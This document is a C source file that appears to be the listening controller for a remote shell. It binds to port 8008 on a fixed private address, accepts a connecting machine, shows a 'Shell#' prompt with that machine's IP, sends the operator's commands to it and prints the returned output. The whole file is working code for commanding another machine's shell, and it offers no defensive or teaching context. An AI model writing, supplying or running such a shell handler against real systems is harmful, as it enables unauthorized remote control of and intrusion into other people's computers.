#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
//test
int main()
{
    int sock;
    int cl_sock;
    struct sockaddr_in sv_info;
    struct sockaddr_in cl_info;
    int i = 0;
    int optVal = 1;
    socklen_t cl_length;
    char sv_ip[] = "192.168.50.145";
    int sv_port = 8008;

    char buffer[1025];
    char response[32769];//32KB and 1 extra byte

    //create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1)//above function returns -1 if theres an error
    {
	printf("Error at socket()");
    }

    //sets socket options
    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0)
    {
	printf("Error setting TCP socket options\n");
	return 1;
    }

    sv_info.sin_family = AF_INET;
    sv_info.sin_addr.s_addr = inet_addr(sv_ip);
    sv_info.sin_port = htons(sv_port);

    //bind socket
    int bindResult;
    bindResult = bind(sock, (struct sockaddr *) &sv_info, sizeof(sv_info));
    if(bindResult != 0)
    {
	printf("Error at bind()\n");
	printf("%s (%d)", strerror(errno), errno);
	return 1;
    }

    //listen on socket
    int listenResult;
    listenResult = listen(sock, 10);
    if(listenResult != 0)
    {
	printf("Error at listen()\n");
	return 1;
    }

listen:
    //accepts connections
    int acceptResult;
    cl_length = sizeof(cl_info);//use this line since it is easier to use address in the accept(); since the size field has to be a pointer.
    acceptResult = accept(sock, (struct sockaddr *) &cl_info, &cl_length);
    if(acceptResult == -1)//returns -1 if error. different from other functions.
    {
	printf("Error at accept(). Listening again\n");
	goto listen;
    }

    while(1)
    {
	memset(buffer, 0, sizeof(buffer));
	memset(response, 0, sizeof(response));

	buffer[sizeof(buffer) - 1] = '\0';
	response[sizeof(response) - 1] = '\0';
	
	printf("Shell#%s~$ ", inet_ntoa(cl_info.sin_addr));

	fgets(buffer, sizeof(buffer), stdin);

	if(strncmp("cd", buffer, 2) == 0)//input check for pre-input
	{
	    memset(buffer, 0, sizeof(buffer));
	    printf("DIR (START FROM ROOT.): ");
	    fgets(buffer, sizeof(buffer), stdin);
	}

	buffer[sizeof(buffer) - 1] = '\0';

	send(acceptResult, buffer, sizeof(buffer), 0);

	if(strncmp("q", buffer, 1) == 0)
	{
	    printf("Closing connection and listening for new connection\n");
	    close(acceptResult);
	    goto listen;
	}
	
	recv(acceptResult, response, sizeof(response), 0);

	printf("%s\n",response);
    }
}
